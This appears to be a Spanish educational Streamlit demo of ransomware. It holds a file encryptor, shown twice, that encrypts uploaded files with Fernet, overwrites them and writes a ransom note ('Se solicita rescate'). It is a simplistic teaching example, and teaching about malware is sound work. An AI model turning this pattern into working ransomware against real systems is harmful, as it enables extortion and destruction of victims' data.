import streamlit as st

# Título
st.title("Ransomware")

# Texto
texto = """
El ransomware es una amenaza de gran importancia que continúa creciendo con el paso del tiempo. 
Según el reciente análisis de mitad de año llevado a cabo por Cisco, 
ya domina el mercado de malware y es el tipo de malware más rentable de la historia.
"""

# Mostrar el texto en Streamlit
st.write(texto)




import streamlit as st
from cryptography.fernet import Fernet
import os

# Funciones
def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(files, key):
    fernet = Fernet(key)
    for file in files:
        file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Save the encrypted file
        with open(file.name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

# Generar y retornar la clave
generarKey()
key = retornarKey()

# Streamlit UI
st.title("Cifrador de Archivos")

uploaded_files = st.file_uploader("Cargar archivos", accept_multiple_files=True)

if uploaded_files:
    st.write(f"{len(uploaded_files)} archivos cargados.")
    encryp(uploaded_files, key)
    st.success("Archivos cifrados con éxito.")

    # Crear y guardar el archivo Readme.txt
    with open("Readme.txt", "w") as file:
        file.write("Archivos encryptados\n")
        file.write("Se solicita rescate")
    st.write("Archivo Readme.txt creado con instrucciones.")

    # Descargar el archivo Readme.txt
    with open("Readme.txt", "rb") as file:
        btn = st.download_button(
            label="Descargar Readme.txt",
            data=file,
            file_name="Readme.txt",
            mime="text/plain"
        )
st.write("""
### Concepto Básico de un Ransomware

Este es un ejemplo básico de cómo funciona un ransomware. Un ransomware cifra archivos en un sistema y solicita un rescate para descifrarlos. A continuación se muestra el código utilizado para cifrar archivos cargados por el usuario.
""")

# Mostrar el código
codigo = '''
import streamlit as st
from cryptography.fernet import Fernet
import os

# Funciones
def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(files, key):
    fernet = Fernet(key)
    for file in files:
        file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Save the encrypted file
        with open(file.name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

# Generar y retornar la clave
generarKey()
key = retornarKey()

# Streamlit UI
st.title("Cifrador de Archivos")

uploaded_files = st.file_uploader("Cargar archivos", accept_multiple_files=True)

if uploaded_files:
    st.write(f"{len(uploaded_files)} archivos cargados.")
    encryp(uploaded_files, key)
    st.success("Archivos cifrados con éxito.")

    # Crear y guardar el archivo Readme.txt
    with open("Readme.txt", "w") as file:
        file.write("Archivos encryptados\\n")
        file.write("Se solicita rescate")
    st.write("Archivo Readme.txt creado con instrucciones.")

    # Descargar el archivo Readme.txt
    with open("Readme.txt", "rb") as file:
        btn = st.download_button(
            label="Descargar Readme.txt",
            data=file,
            file_name="Readme.txt",
            mime="text/plain"
        )
'''

st.code(codigo, language='python')